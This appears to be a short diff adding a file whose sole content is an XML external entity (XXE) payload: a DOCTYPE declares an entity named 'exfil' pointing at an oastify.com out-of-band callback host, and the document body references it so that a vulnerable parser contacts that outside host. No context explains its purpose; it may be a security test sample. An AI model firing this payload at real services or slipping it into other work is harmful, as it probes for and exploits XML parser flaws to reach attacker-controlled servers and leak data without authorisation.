@@ -1,0 +1,7 @@
+
+<!DOCTYPE foo [ 
+<!ENTITY exfil SYSTEM 'http://8nwous73fyq87nal98g84pbj0a61usih.oastify.com'> ]>
+<foo>
+&exfil
+</foo>
+
